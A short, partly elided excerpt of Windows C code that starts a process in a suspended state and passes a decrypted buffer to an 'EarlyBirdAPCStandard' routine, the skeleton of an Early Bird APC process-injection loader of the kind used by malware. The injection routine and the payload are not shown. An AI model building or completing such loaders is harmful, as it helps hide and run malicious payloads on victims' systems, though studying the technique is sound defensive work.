...
BOOL CreateSuspendedProcess(IN LPCWSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread, OUT DWORD* dwThreadId) {
    ...
    Si.cb = sizeof(STARTUPINFO); // Set the size of STARTUPINFO required for CreateProcessW
...
int main() {
    ...
    printf("[i] Creating Process...\n");
    if (!CreateSuspendedProcess(TargetProcessName, &dwProcessId, &hProcess, &hThread, &ThreadId)) {
        printf("\n\t[!] CreateSuspendedProcess Failed! %d", GetLastError());
        HeapFree(GetProcessHeap(), 0, pPlainText);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[i] Process Sucessfully Created! PID -> %d || TID -> %d\n", dwProcessId, ThreadId);
    ...
    EarlyBirdAPCStandard(hProcess, hThread, pPlainText, dwsPlainTextSize);
